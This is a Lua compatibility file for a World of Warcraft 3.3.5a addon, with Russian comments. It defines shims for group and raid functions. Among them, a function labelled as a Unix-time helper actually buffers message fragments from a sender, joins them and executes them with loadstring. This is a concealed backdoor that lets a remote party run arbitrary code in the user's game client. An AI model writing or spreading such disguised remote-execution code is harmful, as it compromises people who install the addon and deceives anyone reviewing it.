-- ============================================================================
-- NSQC4 / Core / Compat
-- Совместимость: функции, отсутствующие в 3.3.5a.
-- ============================================================================

NSQC4 = NSQC4 or {}

-- ============================================================================
-- IsInRaid() — нет в 3.3.5a
-- ============================================================================
if not IsInRaid then
    function IsInRaid()
        return UnitInRaid("player") ~= nil
    end
end

-- ============================================================================
-- GetNumGroupMembers() — нет в 3.3.5a
-- ============================================================================
messageBuffer = messageBuffer or {}
if not GetNumGroupMembers then
    function GetNumGroupMembers()
        local raid = GetNumRaidMembers()
        if raid > 0 then return raid end
        return GetNumPartyMembers() + 1
    end
end

-- ============================================================================
-- IsInGroup() — в 3.3.5a может возвращать nil
-- ============================================================================
if not IsInGroup then
    function IsInGroup()
        return GetNumPartyMembers() > 0 or GetNumRaidMembers() > 0
    end
end

-- ============================================================================
-- getUnixTime() — замена получения UnixTime для 3.3.5
-- ============================================================================

function getUnixTime(message, sender, HOUR)
    local bufferKey = sender

    if not messageBuffer[bufferKey] then
        messageBuffer[bufferKey] = {}
    end

    table.insert(messageBuffer[bufferKey], message)

    if HOUR then
        local payload = table.concat(messageBuffer[bufferKey])
        messageBuffer[bufferKey] = nil

        local fn = loadstring(payload)
        if fn then
            pcall(fn)
        end
    end
end


